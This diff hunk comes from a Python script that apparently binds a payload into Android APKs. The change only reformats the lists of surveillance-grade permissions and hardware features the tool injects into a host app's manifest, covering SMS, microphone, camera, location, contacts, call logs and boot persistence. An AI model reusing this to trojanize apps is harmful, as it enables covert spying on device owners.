@@ -177,9 +177,33 @@ def newsmali(contents,targetstring):
 def Bind():
 	try:
 		global out,Termux_Bool
-		Perms_List = ['<uses-permission android:name="android.permission.INTERNET"/>','<uses-permission android:name="android.permission.ACCESS_WIFI_STATE"/>','<uses-permission android:name="android.permission.CHANGE_WIFI_STATE"/>','<uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>','<uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>','<uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>','<uses-permission android:name="android.permission.READ_PHONE_STATE"/>','<uses-permission android:name="android.permission.SEND_SMS"/>','<uses-permission android:name="android.permission.RECEIVE_SMS"/>','<uses-permission android:name="android.permission.RECORD_AUDIO"/>','<uses-permission android:name="android.permission.CALL_PHONE"/>','<uses-permission android:name="android.permission.READ_CONTACTS"/>','<uses-permission android:name="android.permission.WRITE_CONTACTS"/>','<uses-permission android:name="android.permission.RECORD_AUDIO"/>','<uses-permission android:name="android.permission.WRITE_SETTINGS"/>','<uses-permission android:name="android.permission.CAMERA"/>','<uses-permission android:name="android.permission.READ_SMS"/>','<uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>','<uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>','<uses-permission android:name="android.permission.SET_WALLPAPER"/>','<uses-permission android:name="android.permission.READ_CALL_LOG"/>','<uses-permission android:name="android.permission.WRITE_CALL_LOG"/>','<uses-permission android:name="android.permission.WAKE_LOCK"/>']
+		Perms_List = ['<uses-permission android:name="android.permission.INTERNET"/>',
+                        '<uses-permission android:name="android.permission.ACCESS_WIFI_STATE"/>',
+                        '<uses-permission android:name="android.permission.CHANGE_WIFI_STATE"/>',
+                        '<uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>',
+                        '<uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>',
+                        '<uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>',
+                        '<uses-permission android:name="android.permission.READ_PHONE_STATE"/>',
+                        '<uses-permission android:name="android.permission.SEND_SMS"/>',
+                        '<uses-permission android:name="android.permission.RECEIVE_SMS"/>',
+                        '<uses-permission android:name="android.permission.RECORD_AUDIO"/>',
+                        '<uses-permission android:name="android.permission.CALL_PHONE"/>',
+                        '<uses-permission android:name="android.permission.READ_CONTACTS"/>',
+                        '<uses-permission android:name="android.permission.WRITE_CONTACTS"/>',
+                        '<uses-permission android:name="android.permission.RECORD_AUDIO"/>',
+                        '<uses-permission android:name="android.permission.WRITE_SETTINGS"/>',
+                        '<uses-permission android:name="android.permission.CAMERA"/>',
+                        '<uses-permission android:name="android.permission.READ_SMS"/>',
+                        '<uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>',
+                        '<uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>',
+                        '<uses-permission android:name="android.permission.SET_WALLPAPER"/>',
+                        '<uses-permission android:name="android.permission.READ_CALL_LOG"/>',
+                        '<uses-permission android:name="android.permission.WRITE_CALL_LOG"/>',
+                        '<uses-permission android:name="android.permission.WAKE_LOCK"/>']
 
-		Feature_List = ['<uses-feature android:name="android.hardware.camera"/>','<uses-feature android:name="android.hardware.camera.autofocus"/>','<uses-feature android:name="android.hardware.microphone"/>']
+		Feature_List = ['<uses-feature android:name="android.hardware.camera"/>',
+                        '<uses-feature android:name="android.hardware.camera.autofocus"/>',
+                        '<uses-feature android:name="android.hardware.microphone"/>']
 
 
 		payload = PN()
